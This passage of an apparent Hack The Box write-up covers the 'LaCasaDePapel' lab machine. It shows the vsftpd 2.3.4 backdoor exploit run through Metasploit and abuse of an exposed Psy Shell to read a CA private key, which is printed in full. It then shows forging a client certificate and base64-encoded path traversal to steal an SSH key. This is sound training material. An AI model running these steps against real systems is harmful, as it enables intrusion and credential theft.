&lt;h4 id=&quot;after-hitting-dead-ends-with-web-i-checked-the-ftp-service-again-the-version-was-vsftpd-234-from-the-nmap-scan-so-i-searched-for-exploits-&quot;&gt;After hitting dead ends with web, I checked the &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; service again, the version was &lt;code class=&quot;highlighter-rouge&quot;&gt;vsftpd 2.3.4&lt;/code&gt; (from the &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan) so I searched for exploits :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/lacasadepapel# searchsploit vsftpd 2.3.4
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                                            |  Path
                                                                                                                                                                          | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                    | exploits/unix/remote/17491.rb
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;command-execution-and-there-is-a-metasploit-module-for-it-but-the-exploit-didnt-work-&quot;&gt;Command Execution and there is a &lt;code class=&quot;highlighter-rouge&quot;&gt;metasploit&lt;/code&gt; module for it, but the exploit didn’t work :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 &amp;gt; search vsftpd 2.3.4

Matching Modules
================

   #  Name                                                      Disclosure Date  Rank       Check  Description
   -  ----                                                      ---------------  ----       -----  -----------
   1  auxiliary/gather/teamtalk_creds                                            normal     No     TeamTalk Gather Credentials
   2  exploit/multi/http/oscommerce_installer_unauth_code_exec  2018-04-30       excellent  Yes    osCommerce Installer Unauthenticated Code Execution
   3  exploit/multi/http/struts2_namespace_ognl                 2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
   4  exploit/unix/ftp/vsftpd_234_backdoor                      2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


msf5 &amp;gt; use exploit/unix/ftp/vsftpd_234_backdoor
msf5 exploit(unix/ftp/vsftpd_234_backdoor) &amp;gt; show options 

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target address range or CIDR identifier
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(unix/ftp/vsftpd_234_backdoor) &amp;gt; set rhosts 10.10.10.131
rhosts =&amp;gt; 10.10.10.131
msf5 exploit(unix/ftp/vsftpd_234_backdoor) &amp;gt; exploit 

[*] 10.10.10.131:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.131:21 - USER: 331 Please specify the password.
[+] 10.10.10.131:21 - Backdoor service has been spawned, handling...
[-] 10.10.10.131:21 - The service on port 6200 does not appear to be a shell
[*] Exploit completed, but no session was created.
msf5 exploit(unix/ftp/vsftpd_234_backdoor) &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;apparently-there-was-another-service-running-on-port-6200-a-quick-nmap-scan-shows-that-the-port-is-open-&quot;&gt;Apparently there was another service running on port 6200, a quick &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan shows that the port is open :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lacasadepapel/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-connected-to-that-port-with-nc-to-see-whats-there-&quot;&gt;So I connected to that port with &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; to see what’s there :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/lacasadepapel# nc lacasadepapel.htb 6200
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;the-banner-says-psy-shell-v099-i-didnt-know-what-psy-shell-was-but-a-quick-search-and-i-found-the-website-its-a-shell-used-for-interactive-php-debugging-and-we-can-use-it-to-execute-php&quot;&gt;The banner says &lt;code class=&quot;highlighter-rouge&quot;&gt;Psy Shell v0.9.9&lt;/code&gt;, I didn’t know what &lt;code class=&quot;highlighter-rouge&quot;&gt;Psy Shell&lt;/code&gt; was but a quick search and I found the &lt;a href=&quot;https://psysh.org/&quot;&gt;website&lt;/a&gt;. It’s a shell used for interactive &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; debugging and we can use it to execute &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;i-tried-to-execute-system-commands-but-i-couldnt-&quot;&gt;I tried to execute system commands but I couldn’t :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;exec(&quot;whoami&quot;)
PHP Fatal error:  Call to undefined function exec() in Psy Shell code on line 1
system(&quot;whoami&quot;)
PHP Fatal error:  Call to undefined function system() in Psy Shell code on line 1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-tried-to-use-scandir-to-see-the-current-directory-listing-and-it-worked-&quot;&gt;I tried to use &lt;code class=&quot;highlighter-rouge&quot;&gt;scandir()&lt;/code&gt; to see the current directory listing and it worked :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;scandir(&quot;.&quot;)
=&amp;gt; [
	 &quot;.&quot;,
	 &quot;..&quot;,
	 &quot;.DS_Store&quot;,
	 &quot;._.DS_Store&quot;,
	 &quot;bin&quot;,
	 &quot;boot&quot;,
	 &quot;dev&quot;,
	 &quot;etc&quot;,
	 &quot;home&quot;,
	 &quot;lib&quot;,
	 &quot;lost+found&quot;,
	 &quot;media&quot;,
	 &quot;mnt&quot;,
	 &quot;opt&quot;,
	 &quot;proc&quot;,
	 &quot;root&quot;,
	 &quot;run&quot;,
	 &quot;sbin&quot;,
	 &quot;srv&quot;,
	 &quot;swap&quot;,
	 &quot;sys&quot;,
	 &quot;tmp&quot;,
	 &quot;usr&quot;,
	 &quot;var&quot;,                           
   ]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-could-list-the-directories-in-home-&quot;&gt;I could list the directories in &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;scandir(&quot;home/&quot;)
=&amp;gt; [
     &quot;.&quot;,
     &quot;..&quot;,
     &quot;berlin&quot;,
     &quot;dali&quot;,
     &quot;nairobi&quot;,
     &quot;oslo&quot;,
     &quot;professor&quot;,
   ]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;now-we-know-the-users-on-the-box--berlindalinairobioslo-and-professor&quot;&gt;Now we know the users on the box : &lt;code class=&quot;highlighter-rouge&quot;&gt;berlin&lt;/code&gt;,&lt;code class=&quot;highlighter-rouge&quot;&gt;dali&lt;/code&gt;,&lt;code class=&quot;highlighter-rouge&quot;&gt;nairobi&lt;/code&gt;,&lt;code class=&quot;highlighter-rouge&quot;&gt;oslo&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;professor&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;i-found-the-user-flag-in-homeberlin-however-i-got-permission-denied-when-i-tried-to-read-it-&quot;&gt;I found the user flag in &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/berlin&lt;/code&gt;, however I got permission denied when I tried to read it :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;scandir(&quot;home/berlin&quot;)
=&amp;gt; [
     &quot;.&quot;,
     &quot;..&quot;,
     &quot;.ash_history&quot;,
     &quot;.ssh&quot;,
     &quot;downloads&quot;,
     &quot;node_modules&quot;,
     &quot;server.js&quot;,
     &quot;user.txt&quot;,
   ]
readfile(&quot;home/berlin/user.txt&quot;)
PHP Warning:  readfile(home/berlin/user.txt): failed to open stream: Permission denied in phar://eval()'d code on line 1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;same-for-ssh-after-a-lot-of-failed-attempts-to-get-rce-i-looked-at-the-help-menu-to-see-if-theres-anything-helpful&quot;&gt;Same for &lt;code class=&quot;highlighter-rouge&quot;&gt;.ssh&lt;/code&gt;, after a lot of failed attempts to get &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt;, I looked at the &lt;code class=&quot;highlighter-rouge&quot;&gt;help&lt;/code&gt; menu to see if there’s anything helpful:&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;help
  help       Show a list of commands. Type `help [foo]` for information about [foo].                                Aliases: ?  
  ls         List local, instance or class variables, methods and constants.                                        Aliases: list, dir
  dump       Dump an object or primitive.
  doc        Read the documentation for an object, class, constant, method or property.                             Aliases: rtfm, man  
  show       Show the code for an object, class, constant, method or property.
  wtf        Show the backtrace of the most recent exception.                                                       Aliases: last-exception, wtf?
  whereami   Show where you are in the code.
  throw-up   Throw an exception or error out of the Psy Shell.
  timeit     Profiles with a timer.
  trace      Show the current call stack.
  buffer     Show (or clear) the contents of the code input buffer.                                                 Aliases: buf
  clear      Clear the Psy Shell screen.
  edit       Open an external editor. Afterwards, get produced code in input buffer.
  sudo       Evaluate PHP code, bypassing visibility restrictions.
  history    Show the Psy Shell history.                                                                            Aliases: hist
  exit       End the current session and return to caller.                                                          Aliases: quit, q
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-used-ls-to-see-what-variables-are-there-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;ls&lt;/code&gt; to see what variables are there :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ls
Variables: $tokyo
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;there-was-only-one-variable-called-tokyo--lets-check-that-variable&quot;&gt;There was only one variable called &lt;code class=&quot;highlighter-rouge&quot;&gt;tokyo&lt;/code&gt; , let’s check that variable:&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;show $tokyo
  &amp;gt; 2| class Tokyo {
    3|  private function sign($caCert,$userCsr) {
    4|          $caKey = file_get_contents('/home/nairobi/ca.key');
    5|          $userCert = openssl_csr_sign($userCsr, $caCert, $caKey, 365, ['digest_alg'=&amp;gt;'sha256']);
    6|          openssl_x509_export($userCert, $userCertOut);
    7|          return $userCertOut;
    8|  }
    9| }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;the-function-sign-is-using-the-private-key-homenairobicakey-we-can-grab-that-key-and-create-a-client-certificate-to-access-the-https-service-we-couldnt-access-before&quot;&gt;The function &lt;code class=&quot;highlighter-rouge&quot;&gt;sign()&lt;/code&gt; is using the private key &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/nairobi/ca.key&lt;/code&gt;, we can grab that key and create a client certificate to access the &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; service we couldn’t access before.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;file_get_contents('/home/nairobi/ca.key');
=&amp;gt; &quot;&quot;&quot;
   -----BEGIN PRIVATE KEY-----\n
   MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\n
   7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\n
   2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\n
   uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\n
   YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\n
   s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\n
   PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\n
   Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\n
   1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\n
   /CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\n
   q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\n
   uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\n
   I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\n
   7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\n
   G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\n
   sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\n
   CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\n
   sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\n
   ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\n
   zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\n
   ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\n
   9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\n
   WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\n
   7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\n
   aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\n
   53udBEzjt3WPqYGkkDknVhjD\n
   -----END PRIVATE KEY-----\n
   &quot;&quot;&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;client-certificate-generation&quot;&gt;Client Certificate Generation&lt;/h3&gt;
&lt;h4 id=&quot;first-we-will-create-a-certificate-signing-request-csr-&quot;&gt;First, we will create a certificate signing request (&lt;code class=&quot;highlighter-rouge&quot;&gt;CSR&lt;/code&gt;) :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/lacasadepapel/cert# cat ca.key
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb
7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/
2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl
uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M
YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp
s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us
PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V
Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89
1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ
/CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+
q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr
uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd
I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og
7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE
G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn
sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH
CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y
sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI
ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2
zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/
ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC
9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M
WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM
7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR
aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc
53udBEzjt3WPqYGkkDknVhjD
-----END PRIVATE KEY-----
root@kali:~/Desktop/HTB/boxes/lacasadepapel/cert# openssl req -new -key ca.key -out server.csr                                                                                                                    
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:lacasadepapel.htb
Email Address []:

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-we-will-use-it-to-generate-the-certificate-&quot;&gt;Then we will use it to generate the certificate :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/lacasadepapel/cert# openssl x509 -req -days 365 -in server.csr -signkey ca.key -out server.crt                                                                                      
Signature ok
subject=C = AU, ST = Some-State, O = Internet Widgits Pty Ltd, CN = lacasadepapel.htb
Getting Private key
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;and-finally-we-will-create-a-pkcs12-certificate-&quot;&gt;And finally we will create a &lt;code class=&quot;highlighter-rouge&quot;&gt;PKCS12&lt;/code&gt; certificate :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/lacasadepapel/cert# openssl pkcs12 -export -in server.crt -inkey ca.key -out server.p12
Enter Export Password:
Verifying - Enter Export Password:
root@kali:~/Desktop/HTB/boxes/lacasadepapel/cert# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;now-we-can-import-it-to-firefox-&quot;&gt;Now we can import it to Firefox :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lacasadepapel/7.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/lacasadepapel/8.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/lacasadepapel/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-have-to-remove-the-ssl-exception-we-gave-earlier-to-httpslacasadepapelhtb-then-we-will-visit-it-again-and-it-will-request-our-client-certificate-&quot;&gt;We have to Remove the &lt;code class=&quot;highlighter-rouge&quot;&gt;ssl&lt;/code&gt; exception we gave earlier to &lt;code class=&quot;highlighter-rouge&quot;&gt;https://lacasadepapel.htb&lt;/code&gt;, then we will visit it again and it will request our client certificate :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lacasadepapel/10.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/lacasadepapel/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;path-traversal-arbitrary-file-download-user-flag&quot;&gt;Path Traversal, Arbitrary File Download, User Flag&lt;/h3&gt;
&lt;h4 id=&quot;after-gaining-access-we-have-an-option-to-choose-season-1-or-season-2-clicking-on-one-of-them-will-take-us-to-a-page-to-download-episodes-&quot;&gt;After gaining access we have an option to choose season 1 or season 2, clicking on one of them will take us to a page to download episodes :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lacasadepapel/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;as-you-can-see-in-the-url-there-is-a-get-parameter-called-path-which-means-that-the-php-script-reads-files-from-a-given-path-and-lists-them-in-this-case-directory--season-1-if-that-parameter-doesnt-get-filtered-correctly-it-can-cause-a-path-traversal-vulnerability-allowing-us-to-list-files-in-other-directories-however-listing-files-doesnt-help-us-in-any-way-we-already-can-do-that-with-psy-shell-but-if-we-try-to-download-an-episode-01avi-for-example-&quot;&gt;As you can see in the &lt;code class=&quot;highlighter-rouge&quot;&gt;url&lt;/code&gt; there is a get parameter called &lt;code class=&quot;highlighter-rouge&quot;&gt;path&lt;/code&gt;, which means that the &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; script reads files from a given path and lists them (in this case directory : &lt;code class=&quot;highlighter-rouge&quot;&gt;SEASON-1&lt;/code&gt;). If that parameter doesn’t get filtered correctly it can cause a path traversal vulnerability allowing us to list files in other directories. However listing files doesn’t help us in any way, we already can do that with &lt;code class=&quot;highlighter-rouge&quot;&gt;Psy Shell&lt;/code&gt;. But if we try to download an episode, &lt;code class=&quot;highlighter-rouge&quot;&gt;01.avi&lt;/code&gt; for example :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lacasadepapel/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-download-link-will-be--httpslacasadepapelhtbfileu0vbu09oltevmdeuyxzp&quot;&gt;The download link will be : &lt;code class=&quot;highlighter-rouge&quot;&gt;https://lacasadepapel.htb/file/U0VBU09OLTEvMDEuYXZp&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;decoding-that-base-64-string-we-get-this-&quot;&gt;Decoding that base-64 string we get this :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/lacasadepapel# echo U0VBU09OLTEvMDEuYXZp | base64 -d 
SEASON-1/01.aviroot@kali:~/Desktop/HTB/boxes/lacasadepapel# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;it-uses-the-path-to-request-files-lets-see-where-are-we-first-&quot;&gt;It uses the path to request files, let’s see where are we first :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;https://lacasadepapel/?path=../&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/lacasadepapel/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-are-in-berlins-home-directory-because-the-user-flag-is-there&quot;&gt;We are in &lt;code class=&quot;highlighter-rouge&quot;&gt;berlin&lt;/code&gt;’s home directory (Because the user flag is there).&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;https://lacasadepapel/?path=../.ssh/&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/lacasadepapel/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-download-id_rsa-we-know-that-the-path-is-sshid_rsa-&quot;&gt;Let’s download &lt;code class=&quot;highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt;, we know that the path is &lt;code class=&quot;highlighter-rouge&quot;&gt;../.ssh/id_rsa&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/lacasadepapel# echo -n &quot;../.ssh/id_rsa&quot; | base64
Li4vLnNzaC9pZF9yc2E=
root@kali:~/Desktop/HTB/boxes/lacasadepapel# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;-n-for-no-new-lines&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-n&lt;/code&gt; for no new lines.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;https://lacasadepapel.htb/file/Li4vLnNzaC9pZF9yc2E=&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/lacasadepapel/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-found-the-key-in-berlins-home-directory-however-i-couldnt-get-ssh-as-berlin-i-tried-other-users-and-professor-worked-&quot;&gt;We found the key in &lt;code class=&quot;highlighter-rouge&quot;&gt;berlin&lt;/code&gt;’s home directory, however I couldn’t get &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;berlin&lt;/code&gt;, I tried other users and &lt;code class=&quot;highlighter-rouge&quot;&gt;professor&lt;/code&gt; worked :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lacasadepapel/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-couldnt-read-the-flag-as-professor-so-i-downloaded-it-like-i-downloaded-the-ssh-key-&quot;&gt;I couldn’t read the flag as &lt;code class=&quot;highlighter-rouge&quot;&gt;professor&lt;/code&gt;, so I downloaded it like I downloaded the &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; key :&lt;/h4&gt;
